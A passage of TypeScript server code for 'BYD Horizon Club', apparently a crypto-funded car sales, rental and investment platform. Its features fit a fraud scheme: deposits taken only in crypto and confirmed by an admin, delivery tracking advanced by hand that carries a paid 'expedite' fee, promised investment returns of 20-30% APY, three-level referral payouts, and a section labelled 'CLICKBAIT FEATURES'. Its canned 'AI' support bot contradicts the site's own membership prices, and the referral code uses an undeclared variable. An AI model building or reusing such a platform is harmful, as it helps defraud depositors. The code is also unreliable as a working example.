app.post("/api/tracking/expedite", authenticateUser, async (req: any, res) => {
  const { txHash } = req.body;
  const db = await getDb();
  const user = await db.get("SELECT balance FROM users WHERE id = ?", [req.user.id]);
  if (!user || (user.balance || 0) < 49) return res.status(400).json({ error: "Insufficient balance for expedite fee ($49)." });
  await db.run("UPDATE users SET balance = balance - 49 WHERE id = ?", [req.user.id]);
  await db.run("UPDATE map_tracking SET expedite_paid = 1 WHERE user_id = ?", [req.user.id]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'tracking', 'Expedite Paid', 'Your delivery has been expedited. Priority routing activated.')", [req.user.id]);
  res.json({ success: true, message: "Expedite fee paid. Priority routing activated." });
});

// ==================== TRON AUTO-VERIFY ====================
const TRONGRID_API = "https://api.trongrid.io/v1";

app.post("/api/payments/verify-crypto", authenticateUser, async (req: any, res) => {
  const { paymentId } = req.body;
  if (!paymentId) return res.status(400).json({ error: "Payment ID required." });
  const db = await getDb();
  const payment = await db.get("SELECT * FROM payments WHERE id = ? AND user_id = ? AND status = 'pending'", [paymentId, req.user.id]);
  if (!payment) return res.status(404).json({ error: "Pending payment not found." });
  
  // Attempt to verify via TronGrid API
  try {
    const txHash = payment.transaction_hash;
    const verifyUrl = `${TRONGRID_API}/transactions/${txHash}`;
    const response = await fetch(verifyUrl, {
      headers: { "Accept": "application/json", "TRON-PRO-API-KEY": process.env.TRONGRID_API_KEY || "" }
    });
    if (response.ok) {
      const data = await response.json() as any;
      if (data.ret && data.ret[0]?.contractRet === "SUCCESS") {
        // Auto-confirm the payment
        await db.run("UPDATE payments SET status = 'confirmed', updated_at = CURRENT_TIMESTAMP WHERE id = ?", [payment.id]);
        const points = Math.floor(payment.amount * 10);
        await db.run("UPDATE users SET horizon_points = horizon_points + ?, balance = balance + ? WHERE id = ?", [points, payment.amount, payment.user_id]);
        await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'payment', 'Payment Auto-Verified', 'Your deposit of $' || ? || ' has been verified and credited.')", [payment.user_id, payment.amount]);
        await logAdminAction("Auto-verified payment", `Payment ID ${payment.id} via TronGrid`, req.ip, 0);
        return res.json({ success: true, verified: true, message: "Payment verified and credited." });
      }
    }
  } catch (e) { /* TronGrid unavailable, fall through */ }
  
  // If auto-verify fails, mark as awaiting manual review
  res.json({ success: true, verified: false, message: "Awaiting admin manual confirmation." });
});

// ==================== WITHDRAWALS ====================

app.post("/api/payments/withdraw", authenticateUser, async (req: any, res) => {
  const { amount, walletAddress, source } = req.body;
  if (!amount || !walletAddress) return res.status(400).json({ error: "Amount and wallet address required." });
  if (parseFloat(amount) < 50) return res.status(400).json({ error: "Minimum withdrawal is $50." });
  const db = await getDb();
  const user = await db.get("SELECT kyc_status, balance FROM users WHERE id = ?", [req.user.id]);
  if (!user || user.kyc_status !== "verified") return res.status(403).json({ error: "KYC required for withdrawals.", kycRequired: true });
  if ((user.balance || 0) < parseFloat(amount)) return res.status(403).json({ error: "Insufficient balance." });
  await db.run("UPDATE users SET balance = balance - ? WHERE id = ?", [parseFloat(amount), req.user.id]);
  await db.run("INSERT INTO withdrawals (user_id, amount, wallet_address, currency, network, status) VALUES (?,?,?,'USDT','TRC20','pending')", [req.user.id, parseFloat(amount), walletAddress]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'withdrawal', 'Withdrawal Submitted', 'Your withdrawal of $' || ? || ' is pending admin approval.')", [req.user.id, amount]);
  await logUserInteraction(req.user.id, req.user.email, "WITHDRAWAL", `Withdrawal of $${amount} to ${walletAddress}`);
  res.json({ success: true, message: "Withdrawal submitted for admin approval." });
});

app.get("/api/payments/withdrawals", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const withdrawals = await db.all("SELECT * FROM withdrawals WHERE user_id = ? ORDER BY id DESC", [req.user.id]);
  res.json(withdrawals);
});

app.get("/api/admin/withdrawals", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const withdrawals = await db.all("SELECT w.*, u.name as user_name, u.email as user_email FROM withdrawals w JOIN users u ON w.user_id = u.id ORDER BY w.id DESC");
  res.json(withdrawals);
});

app.post("/api/admin/withdrawals/:id/confirm", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const wd = await db.get("SELECT * FROM withdrawals WHERE id = ? AND status = 'pending'", [req.params.id]);
  if (!wd) return res.status(404).json({ error: "Pending withdrawal not found." });
  await db.run("UPDATE withdrawals SET status = 'confirmed', updated_at = CURRENT_TIMESTAMP WHERE id = ?", [wd.id]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'withdrawal', 'Withdrawal Confirmed', 'Your withdrawal of $' || ? || ' has been processed to your wallet.')", [wd.user_id, wd.amount]);
  await logAdminAction("Confirmed withdrawal", `Withdrawal ID ${wd.id} - $${wd.amount} to ${wd.wallet_address}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/withdrawals/:id/reject", authenticateAdmin, async (req: any, res) => {
  const { reason } = req.body;
  const db = await getDb();
  const wd = await db.get("SELECT * FROM withdrawals WHERE id = ? AND status = 'pending'", [req.params.id]);
  if (!wd) return res.status(404).json({ error: "Pending withdrawal not found." });
  await db.run("UPDATE withdrawals SET status = 'rejected', admin_note = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?", [reason || 'Rejected by admin', wd.id]);
  await db.run("UPDATE users SET balance = balance + ? WHERE id = ?", [wd.amount, wd.user_id]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'withdrawal', 'Withdrawal Rejected', 'Your withdrawal of $' || ? || ' was rejected.' || CASE WHEN ? IS NOT NULL THEN ' Reason: ' || ? ELSE '' END)", [wd.user_id, wd.amount, reason, reason]);
  await logAdminAction("Rejected withdrawal", `Withdrawal ID ${wd.id} - $${wd.amount}. Reason: ${reason || 'N/A'}`, req.ip, req.adminId);
  res.json({ success: true });
});

// ==================== AI CUSTOMER SUPPORT ====================
const BYD_KNOWLEDGE = {
  models: {
    "seal": { name: "BYD Seal", price: 45900, range: "323mi", power: "530HP", accel: "3.8s", desc: "High-performance ocean-inspired sport sedan with dual motor AWD." },
    "han": { name: "BYD Han", price: 52500, range: "375mi", power: "517HP", accel: "3.9s", desc: "Executive flagship luxury sedan with Nappa leather and Dynaudio audio." },
    "atto3": { name: "BYD Atto 3", price: 38900, range: "260mi", power: "201HP", accel: "7.3s", desc: "Bold urban electric SUV crossover with gym-inspired interior." },
    "dolphin": { name: "BYD Dolphin", price: 29900, range: "211mi", power: "94HP", accel: "7.0s", desc: "Agile, playful urban commuter hatchback with ocean-flow design." },
    "tang": { name: "BYD Tang", price: 58000, range: "310mi", power: "509HP", accel: "4.4s", desc: "7-seater family luxury SUV with DiSus-C active suspension." },
    "shark": { name: "BYD Shark", price: 55000, range: "280mi", power: "480HP", accel: "4.5s", desc: "Adventure-ready pickup truck with dual motor and V2L capability." },
    "super9": { name: "BYD Super 9", price: 85000, range: "350mi", power: "680HP", accel: "2.9s", desc: "Hypercar with carbon fiber chassis and active aero." }
  },
  membership: {
    "elite": { price: 200, benefits: ["15% rental discount", "Investment access", "Mystery Car reveal game", "Priority support", "Exclusive rewards"] }
  },
  policies: {
    "payment": "We accept cryptocurrency (USDT, BTC, ETH) only. $150 minimum deposit. Admin confirms all deposits.",
    "kyc": "KYC verification required before deposits, purchases, or rentals. Upload government ID + selfie.",
    "insurance": "Basic $15/day ($50K coverage), Premium $30/day ($100K), Elite $60/day ($250K).",
    "delivery": "Vehicle delivery within 7-14 business days after admin confirmation. Track via live GPS map.",
    "referral": "Earn $50 per direct referral. Level 2 referrals earn $10. Level 3 earn $5.",
    "rental": "Daily rental rates: Seal $150/day, Han $175/day, Atto 3 $120/day, Dolphin $95/day.",
    "investment": "Stock Pool (20% APY), Expansion Fund (25% APY), Battery Tech (30% APY). Min $150.",
    "refund": "Refund requests within 14 days. Crypto refunds to originating wallet.",
    "elite": "Elite membership auto-renews monthly. Cancel 7 days before renewal."
  },
  company: {
    "name": "BYD Horizon Club",
    "tagline": "Own the future. Drive the present. Earn the difference.",
    "founded": "2024",
    "hq": "Shenzhen, China (BYD) / Los Angeles, USA (Horizon Club)",
    "fleet_size": "25+ BYD models available",
    "countries": "USA, UK, Germany, Nigeria, Kenya, Singapore, UAE, Australia, Brazil, China"
  }
};

app.post("/api/ai/chat", authenticateUser, async (req: any, res) => {
  const { message } = req.body;
  if (!message) return res.status(400).json({ error: "Message required." });
  const db = await getDb();
  const user = await db.get("SELECT name, membership_tier, kyc_status, balance FROM users WHERE id = ?", [req.user.id]);
  const lowerMsg = message.toLowerCase();
  let reply = "";
  let topic = "general";

  // Greeting
  if (lowerMsg.match(/^(hi|hello|hey|good morning|good afternoon|what's up)/)) {
    reply = `Hello ${user?.name || 'there'}! Welcome to BYD Horizon Club. I'm your AI assistant. How can I help you today? I can help with vehicle info, pricing, payments, membership, insurance, investments, and more.`;
    topic = "greeting";
  }
  // Vehicle queries
  else if (lowerMsg.match(/(seal|han|atto|dolphin|tang|shark|super.?9|vehicle|car|model|fleet)/)) {
    const modelKey = Object.keys(BYD_KNOWLEDGE.models).find(k => lowerMsg.includes(k));
    if (modelKey) {
      const m = BYD_KNOWLEDGE.models[modelKey as keyof typeof BYD_KNOWLEDGE.models];
      reply = `${m.name}: $${m.price.toLocaleString()} | Range: ${m.range} | Power: ${m.power} | 0-60: ${m.accel}\n${m.desc}\n\nAvailable for purchase or daily rental. Want to know more about financing or rental rates?`;
    } else {
      reply = "Our fleet includes: BYD Seal ($45.9K), Han ($52.5K), Atto 3 ($38.9K), Dolphin ($29.9K), Tang ($58K), Shark ($55K), and Super 9 ($85K). Which model interests you?";
    }
    topic = "vehicles";
  }
  // Pricing / cost
  else if (lowerMsg.match(/(price|cost|how much|expensive|cheap|afford|budget|finance|monthly|payment)/)) {
    reply = "Our vehicles range from $29,900 (Dolphin) to $85,000 (Super 9). Monthly financing available. All purchases require a minimum $150 deposit via crypto. Admin confirms every payment. Want details on a specific model?";
    topic = "pricing";
  }
  // Payment / deposit
  else if (lowerMsg.match(/(deposit|pay|crypto|usdt|btc|eth|wallet|transaction|top.?up)/)) {
    const balance = user?.balance || 0;
    reply = `Your current balance: $${balance.toFixed(2)}. We accept USDT, BTC, and ETH. Minimum deposit: $150. Send crypto to the wallet address shown in your payment portal, then enter the transaction hash. Admin confirms all deposits within minutes.`;
    topic = "payments";
  }
  // KYC
  else if (lowerMsg.match(/(kyc|verify|verification|identity|id|selfie|passport|upload)/)) {
    reply = `KYC Status: ${user?.kyc_status || 'not submitted'}. To verify: go to Dashboard → KYC tab. Upload government-issued ID (front + back), a selfie, and proof of address. Verification typically takes 24 hours. Required before any deposits or purchases.`;
    topic = "kyc";
  }
  // Membership / Elite
  else if (lowerMsg.match(/(membership|elite|silver|gold|platinum|subscribe|premium|vip)/)) {
    const tier = user?.membership_tier || "standard";
    reply = `Your current tier: ${tier.toUpperCase()}. Elite plans: Silver ($299/mo), Gold ($599/mo), Platinum ($999/mo). Benefits include priority delivery, discounts, free insurance, and exclusive events. Upgrade anytime from the Elite tab.`;
    topic = "membership";
  }
  // Insurance
  else if (lowerMsg.match(/(insurance|coverage|protect|damage|accident|claim)/)) {
    reply = "Insurance options: Basic ($15/day, $50K coverage), Premium ($30/day, $100K coverage), Elite ($60/day, $250K coverage). Purchase after selecting a vehicle. Covers collision, theft, and weather damage.";
    topic = "insurance";
  }
  // Investment
  else if (lowerMsg.match(/(invest|stock|fund|apy|return|portfolio|battery tech|expansion)/)) {
    reply = "Investment options: Stock Pool (20% APY, min $150), Expansion Fund (25% APY, min $500), Production Facilities (20% APY, min $1000), Charging Network (15% APY, min $250), Battery Tech Fund (30% APY, min $200). All require verified KYC.";
    topic = "investments";
  }
  // Referral
  else if (lowerMsg.match(/(referral|refer|invite|friend|earn|bonus|commission)/)) {
    reply = `Your referral code: ${user ? 'check your Referrals tab' : 'N/A'}. Earn $50 per direct referral, $10 for level 2, $5 for level 3. Referred users must complete KYC and make a qualifying payment. Minimum $200 to withdraw.`;
    topic = "referrals";
  }
  // Rental
  else if (lowerMsg.match(/(rent|rental|book|booking|daily rate)/)) {
    reply = "Daily rental rates: Seal $150/day, Han $175/day, Atto 3 $120/day, Dolphin $95/day, Tang $200/day. Insurance is mandatory (from $15/day). Select dates, delivery city, and extras. Balance is deducted upon admin confirmation.";
    topic = "rentals";
  }
  // Tracking / delivery
  else if (lowerMsg.match(/(track|delivery|where|shipping|transit|dispatch|eta)/)) {
    reply = "After purchase or rental confirmation, your vehicle appears in the Tracking tab with live GPS. Admin updates delivery progress (0-100%). You'll receive notifications at each milestone. Average delivery: 7-14 business days.";
    topic = "tracking";
  }
  // Contact / support
  else if (lowerMsg.match(/(support|help|contact|agent|human|speak|talk|issue|problem|complaint)/)) {
    reply = "I'm here to help with any questions! For complex issues, submit a ticket via the Support tab. Our team responds within 24 hours. You can also reach us via WhatsApp or Telegram from the footer links.";
    topic = "support";
  }
  // Balance
  else if (lowerMsg.match(/(balance|how much do i have|account|funds|money)/)) {
    reply = `Your current balance: $${(user?.balance || 0).toFixed(2)}. Your Horizon Points: ${(user as any)?.horizon_points || 0}. Deposit crypto to add funds. Admin confirms all deposits.`;
    topic = "balance";
  }
  // Default
  else {
    reply = "I can help with: vehicle info, pricing, payments, KYC verification, membership plans, insurance, investments, referrals, rentals, tracking, and account balance. What would you like to know?";
    topic = "general";
  }

  // Log the conversation
  await db.run("INSERT INTO chatbot_conversations (user_id, message, response) VALUES (?, ?, ?)", [req.user.id, message, reply]);
  
  res.json({ reply, topic });
});

app.get("/api/ai/chat/history", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const history = await db.all("SELECT * FROM chatbot_conversations WHERE user_id = ? ORDER BY id DESC LIMIT 50", [req.user.id]);
  res.json(history.reverse());
});

// ==================== AI FRAUD DETECTION ====================
app.get("/api/admin/fraud-alerts", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const alerts: any[] = [];
  
  // Check for multiple accounts from same IP
  const ipUsers = await db.all("SELECT ip_address, COUNT(DISTINCT user_id) as count, GROUP_CONCAT(user_id) as user_ids FROM user_interactions WHERE ip_address IS NOT NULL GROUP BY ip_address HAVING count > 1");
  for (const ip of ipUsers) {
    alerts.push({ type: "multi_account", severity: "high", message: `${ip.count} accounts from IP ${ip.ip_address}`, user_ids: ip.user_ids, ip: ip.ip_address });
  }
  
  // Check for rapid successive deposits
  const rapidDeposits = await db.all("SELECT user_id, COUNT(*) as count FROM payments WHERE status = 'pending' AND created_at > datetime('now', '-1 hour') GROUP BY user_id HAVING count >= 3");
  for (const rd of rapidDeposits) {
    const user = await db.get("SELECT name, email FROM users WHERE id = ?", [rd.user_id]);
    alerts.push({ type: "rapid_deposits", severity: "medium", message: `${rd.count} pending deposits in 1 hour from ${user?.name || 'unknown'}`, user_id: rd.user_id });
  }
  
  // Check for unusually large deposits
  const largeDeposits = await db.all("SELECT p.*, u.name as user_name FROM payments p JOIN users u ON p.user_id = u.id WHERE p.amount > 10000 AND p.status = 'pending'");
  for (const ld of largeDeposits) {
    alerts.push({ type: "large_deposit", severity: "medium", message: `$${ld.amount} deposit from ${ld.user_name} (ID: ${ld.user_id})`, user_id: ld.user_id, amount: ld.amount });
  }
  
  // Check for users with blocked status making deposits
  const blockedDeposits = await db.all("SELECT p.*, u.name as user_name FROM payments p JOIN users u ON p.user_id = u.id WHERE u.status = 'blocked' AND p.status = 'pending'");
  for (const bd of blockedDeposits) {
    alerts.push({ type: "blocked_user_deposit", severity: "critical", message: `Blocked user ${bd.user_name} attempting deposit`, user_id: bd.user_id });
  }
  
  // Check for withdrawal patterns (balance < 0 after large withdrawal)
  const suspiciousWithdrawals = await db.all("SELECT u.id, u.name, u.balance FROM users u WHERE u.balance < -100");
  for (const sw of suspiciousWithdrawals) {
    alerts.push({ type: "negative_balance", severity: "critical", message: `${sw.name} has negative balance: $${sw.balance}`, user_id: sw.id });
  }
  
  res.json({ alerts, count: alerts.length, checked_at: new Date().toISOString() });
});

app.post("/api/admin/fraud-action", authenticateAdmin, async (req: any, res) => {
  const { userId, action, reason } = req.body;
  const db = await getDb();
  if (action === 'block') {
    await db.run("UPDATE users SET status = 'blocked' WHERE id = ?", [userId]);
    await logAdminAction("Blocked user (fraud)", `User ${userId}: ${reason}`, req.ip, req.adminId);
  } else if (action === 'flag') {
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'security', 'Account Flagged', 'Your account has been flagged for review. Please contact support.')", [userId]);
    await logAdminAction("Flagged user (fraud)", `User ${userId}: ${reason}`, req.ip, req.adminId);
  }
  res.json({ success: true });
});

// ==================== KYC SUBMISSION ====================
app.post("/api/kyc/submit", authenticateUser, async (req: any, res) => {
  const { id_front, id_back, selfie } = req.body;
  if (!id_front || !id_back || !selfie) return res.status(400).json({ error: "All three photos required: ID front, ID back, and selfie." });
  const db = await getDb();
  const user = await db.get("SELECT kyc_status FROM users WHERE id = ?", [req.user.id]);
  if (user?.kyc_status === "verified") return res.status(400).json({ error: "KYC already verified." });
  
  // Store KYC submission (in production, images would be uploaded to cloud storage)
  await db.run("UPDATE users SET kyc_status = 'pending', updated_at = CURRENT_TIMESTAMP WHERE id = ?", [req.user.id]);
  await db.run("INSERT INTO admin_audit_log (action, details, ip_address, admin_id) VALUES (?, ?, ?, 0)", [
    `KYC submitted by user ${req.user.id}`,
    `User uploaded ID front, ID back, and selfie for verification.`,
    req.ip
  ]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'kyc', 'KYC Submitted', 'Your identity documents have been submitted for review. This usually takes 24 hours.')", [req.user.id]);
  
  res.json({ success: true, message: "KYC documents submitted for review." });
});

app.get("/api/kyc/status", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const user = await db.get("SELECT kyc_status FROM users WHERE id = ?", [req.user.id]);
  res.json({ status: user?.kyc_status || "not_submitted" });
});

// ==================== PUSH NOTIFICATIONS ====================
app.get("/api/notifications", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const notifications = await db.all("SELECT * FROM notifications WHERE user_id = ? ORDER BY id DESC LIMIT 20", [req.user.id]);
  res.json(notifications);
});

app.post("/api/notifications/read", authenticateUser, async (req: any, res) => {
  const { notificationIds } = req.body;
  const db = await getDb();
  if (notificationIds && notificationIds.length > 0) {
    const placeholders = notificationIds.map(() => "?").join(",");
    await db.run(`UPDATE notifications SET is_read = 1 WHERE id IN (${placeholders}) AND user_id = ?`, [...notificationIds, req.user.id]);
  } else {
    await db.run("UPDATE notifications SET is_read = 1 WHERE user_id = ?", [req.user.id]);
  }
  res.json({ success: true });
});

app.post("/api/notifications/send", authenticateUser, async (req: any, res) => {
  const { title, message, type } = req.body;
  if (!title || !message) return res.status(400).json({ error: "Title and message required." });
  const db = await getDb();
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, ?, ?, ?)", [req.user.id, type || "system", title, message]);
  res.json({ success: true });
});

app.get("/api/admin/notifications", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const all = await db.all("SELECT n.*, u.name as user_name FROM notifications n JOIN users u ON n.user_id = u.id ORDER BY n.id DESC LIMIT 100");
  res.json(all);
});

app.post("/api/admin/notifications/send", authenticateAdmin, async (req: any, res) => {
  const { userId, title, message, type } = req.body;
  if (!userId || !title || !message) return res.status(400).json({ error: "userId, title, and message required." });
  const db = await getDb();
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, ?, ?, ?)", [userId, type || "admin", title, message]);
  await logAdminAction("Sent notification", `To user ${userId}: ${title}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/notifications/broadcast", authenticateAdmin, async (req: any, res) => {
  const { title, message, type } = req.body;
  if (!title || !message) return res.status(400).json({ error: "Title and message required." });
  const db = await getDb();
  const users = await db.all("SELECT id FROM users WHERE status != 'blocked'");
  for (const u of users) {
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, ?, ?, ?)", [u.id, type || "broadcast", title, message]);
  }
  await logAdminAction("Broadcast notification", `To ${users.length} users: ${title}`, req.ip, req.adminId);
  res.json({ success: true, sent: users.length });
});

// ==================== INSURANCE ====================

app.post("/api/insurance/purchase", authenticateUser, async (req: any, res) => {
  const { carModel, planName, premium, limit } = req.body;
  if (!carModel || !planName || !premium) return res.status(400).json({ error: "All insurance fields required." });
  const db = await getDb();
  const user = await db.get("SELECT kyc_status, balance FROM users WHERE id = ?", [req.user.id]);
  if (!user || user.kyc_status !== "verified") return res.status(403).json({ error: "KYC required for insurance.", kycRequired: true });
  if ((user.balance || 0) < parseFloat(premium)) return res.status(403).json({ error: "Insufficient balance to purchase insurance." });
  await db.run("UPDATE users SET balance = balance - ? WHERE id = ?", [parseFloat(premium), req.user.id]);
  const policyNum = "BYH-POL-" + crypto.randomBytes(6).toString("hex").toUpperCase();
  await db.run("INSERT INTO insurance_policies (user_id, policy_number, car_model, plan_name, monthly_premium, coverage_limit, status) VALUES (?,?,?,?,?,?,'Active')", [req.user.id, policyNum, carModel, planName, parseFloat(premium), parseFloat(limit || 50000)]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'insurance', 'Insurance Active', 'Policy ' || ? || ' is now active.')", [req.user.id, policyNum]);
  res.json({ success: true, policy_number: policyNum, message: "Insurance policy activated." });
});

// ==================== REFERRALS ====================

app.post("/api/referrals/claim", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const user = await db.get("SELECT * FROM users WHERE id = ?", [req.user.id]);
  const pendingRefs = await db.all("SELECT * FROM referrals WHERE referrer_id = ? AND status = 'pending'", [req.user.id]);
  let qualifyingCount = 0;
  for (const ref of pendingRefs) {
    const pc = await db.get("SELECT COUNT(*) as count FROM payments WHERE user_id = ? AND status = 'confirmed'", [ref.referred_user_id]);
    if (pc.count >= 2) qualifyingCount++;
  }
  const earnings = qualifyingCount * 50;
  if (earnings < 200) return res.status(400).json({ error: "Minimum $200 required. Refer more friends!" });
  await db.run("UPDATE referrals SET status = 'paid' WHERE referrer_id = ? AND status = 'pending'", [req.user.id]);
  await db.run("UPDATE users SET balance = balance + ?, horizon_points = horizon_points + ? WHERE id = ?", [earnings, earnings * 10, req.user.id]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'referral', 'Referral Earnings', 'You earned $' || ? || ' in referral rewards!')", [req.user.id, earnings]);
  res.json({ success: true, amount: earnings, message: `$${earnings} claimed!` });
});

app.get("/api/referrals/tree", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  // Level 1: direct referrals
  const level1 = await db.all("SELECT u.id, u.name, u.email, u.created_at, u.kyc_status, r.status as ref_status FROM referrals r JOIN users u ON r.referred_user_id = u.id WHERE r.referrer_id = ?", [req.user.id]);
  // Level 2: referrals of referrals
  const level2Ids: number[] = [];
  for (const ref of level1) {
    const l2 = await db.all("SELECT u.id, u.name, u.email, u.created_at, u.kyc_status FROM referrals r JOIN users u ON r.referred_user_id = u.id WHERE r.referrer_id = ?", [ref.id]);
    level2.push(...l2.map((r: any) => ({ ...r, level: 2, parent: ref.name })));
    level2Ids.push(...l2.map((r: any) => r.id));
  }
  // Level 3: referrals of referrals of referrals
  const level3: any[] = [];
  for (const l2id of level2Ids) {
    const l3 = await db.all("SELECT u.id, u.name, u.email, u.created_at FROM referrals r JOIN users u ON r.referred_user_id = u.id WHERE r.referrer_id = ?", [l2id]);
    level3.push(...l3.map((r: any) => ({ ...r, level: 3 })));
  }
  // Calculate earnings
  const directEarnings = level1.length * 50;
  const level2Earnings = level2.length * 10;
  const level3Earnings = level3.length * 5;
  const totalEarnings = directEarnings + level2Earnings + level3Earnings;
  // Determine achievement tier
  const totalRefs = level1.length + level2.length + level3.length;
  let achievement = "None";
  if (totalRefs >= 30) achievement = "Platinum";
  else if (totalRefs >= 15) achievement = "Gold";
  else if (totalRefs >= 7) achievement = "Silver";
  else if (totalRefs >= 3) achievement = "Bronze";
  res.json({ level1, level2, level3, earnings: { direct: directEarnings, level2: level2Earnings, level3: level3Earnings, total: totalEarnings }, achievement, totalRefs });
});

// ==================== REWARDS ====================

app.get("/api/rewards/items", async (req, res) => {
  const db = await getDb();
  const items = await db.all("SELECT * FROM rewards_store");
  res.json(items);
});

app.post("/api/rewards/redeem", authenticateUser, async (req: any, res) => {
  const { itemId } = req.body;
  if (!itemId) return res.status(400).json({ error: "Item ID required." });
  const db = await getDb();
  const item = await db.get("SELECT * FROM rewards_store WHERE id = ?", [itemId]);
  if (!item) return res.status(404).json({ error: "Item not found." });
  if (item.status === "Out of Stock") return res.status(400).json({ error: "Item out of stock." });
  if (req.user.horizon_points < item.points_cost) return res.status(400).json({ error: `Insufficient points. Need ${item.points_cost}.` });
  const newPoints = req.user.horizon_points - item.points_cost;
  await db.run("UPDATE users SET horizon_points = ? WHERE id = ?", [newPoints, req.user.id]);
  const trackingNum = "BYD-TRK-" + crypto.randomBytes(6).toString("hex").toUpperCase();
  await db.run("INSERT INTO rewards_redemptions (user_id, item_name, points_spent, tracking_number, status) VALUES (?,?,?,?,'Processing')", [req.user.id, item.name, item.points_cost, trackingNum]);
  res.json({ success: true, message: `Redeemed ${item.name}!`, newPoints, tracking_number: trackingNum });
});

// ==================== GAMIFICATION ====================

app.post("/api/daily-checkin", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const today = new Date().toISOString().split("T")[0];
  const existing = await db.get("SELECT id FROM daily_checkins WHERE user_id = ? AND checkin_date = ?", [req.user.id, today]);
  if (existing) return res.status(400).json({ error: "Already checked in today." });
  const gc = await db.get("SELECT config_json FROM gamification_config WHERE feature_key = 'daily_checkin' AND enabled = 1");
  const config = gc ? JSON.parse(gc.config_json || '{}') : {};
  const basePoints = config.base_points || 100;
  const streakMultiplier = config.streak_multiplier || 1.5;
  let streak = (req.user.daily_streak || 0) + 1;
  const lastCheckin = req.user.last_checkin_date;
  if (lastCheckin) {
    const diffDays = Math.floor((new Date(today).getTime() - new Date(lastCheckin).getTime()) / 86400000);
    if (diffDays > 1) streak = 1;
  }
  const points = Math.floor(basePoints * (1 + (streak - 1) * 0.1 * streakMultiplier));
  await db.run("INSERT INTO daily_checkins (user_id, checkin_date, streak_count, points_awarded) VALUES (?,?,?,?)", [req.user.id, today, streak, points]);
  await db.run("UPDATE users SET horizon_points = horizon_points + ?, daily_streak = ?, last_checkin_date = ? WHERE id = ?", [points, streak, today, req.user.id]);
  res.json({ success: true, points, streak, message: `+${points} points! Streak: ${streak} days` });
});

app.get("/api/checkin/status", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const today = new Date().toISOString().split("T")[0];
  const checkedIn = await db.get("SELECT id FROM daily_checkins WHERE user_id = ? AND checkin_date = ?", [req.user.id, today]);
  const gc = await db.get("SELECT config_json FROM gamification_config WHERE feature_key = 'daily_checkin' AND enabled = 1");
  const config = gc ? JSON.parse(gc.config_json || '{}') : {};
  res.json({ checkedIn: !!checkedIn, streak: req.user.daily_streak || 0, basePoints: config.base_points || 100 });
});

app.post("/api/spin-wheel", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const today = new Date().toISOString().split("T")[0];
  const existing = await db.get("SELECT id FROM spin_wheel_logs WHERE user_id = ? AND spin_date = ?", [req.user.id, today]);
  if (existing) return res.status(400).json({ error: "Already spun today." });
  const gc = await db.get("SELECT config_json FROM gamification_config WHERE feature_key = 'spin_wheel' AND enabled = 1");
  const config = gc ? JSON.parse(gc.config_json || '{}') : {};
  const minPts = config.min_points || 10;
  const maxPts = config.max_points || 500;
  const points = Math.floor(Math.random() * (maxPts - minPts + 1)) + minPts;
  await db.run("INSERT INTO spin_wheel_logs (user_id, spin_date, points_awarded) VALUES (?,?,?)", [req.user.id, today, points]);
  await db.run("UPDATE users SET horizon_points = horizon_points + ? WHERE id = ?", [points, req.user.id]);
  res.json({ success: true, points, message: `+${points} points!` });
});

app.post("/api/quiz/submit", authenticateUser, async (req: any, res) => {
  const { answers } = req.body;
  if (!answers) return res.status(400).json({ error: "Answers required." });
  const db = await getDb();
  const questions = await db.all("SELECT * FROM quiz_questions ORDER BY order_num ASC");
  let recommendedCar = questions[Math.floor(Math.random() * questions.length)]?.recommended_car || "BYD Seal";
  await db.run("INSERT INTO quiz_results (user_id, quiz_date, result_car_model) VALUES (?, CURRENT_TIMESTAMP, ?)", [req.user.id, recommendedCar]);
  res.json({ success: true, recommended_car: recommendedCar, message: `Your perfect match: ${recommendedCar}!` });
});

app.get("/api/quiz/questions", async (req, res) => {
  const db = await getDb();
  const questions = await db.all("SELECT * FROM quiz_questions ORDER BY order_num ASC");
  res.json(questions.map(q => ({ ...q, options: JSON.parse(q.options) })));
});

// ==================== CLICKBAIT FEATURES ====================

// 1. Drive to Earn
app.post("/api/drive-to-earn/log", authenticateUser, async (req: any, res) => {
  const { milesDriven, chargingTime } = req.body;
  if (!milesDriven) return res.status(400).json({ error: "Miles driven required." });
  const db = await getDb();
  const gc = await db.get("SELECT config_json FROM gamification_config WHERE feature_key = 'drive_to_earn' AND enabled = 1");
  if (!gc?.enabled) return res.status(400).json({ error: "Drive to Earn is currently disabled." });
  const config = JSON.parse(gc.config_json || '{}');
  const ptsPerMile = config.points_per_mile || 100;
  const bonusPercent = config.bonus_percent || 50;
  const today = new Date().toISOString().split("T")[0];
  const weekStart = new Date(Date.now() - ((new Date().getDay() || 7) - 1) * 86400000).toISOString().split("T")[0];
  let points = Math.floor(parseFloat(milesDriven) * ptsPerMile);
  // Check if user has referred someone this week for bonus
  const refThisWeek = await db.get("SELECT COUNT(*) as count FROM referrals WHERE referrer_id = ? AND created_at >= ?", [req.user.id, weekStart]);
  if (refThisWeek.count > 0) points = Math.floor(points * (1 + bonusPercent / 100));
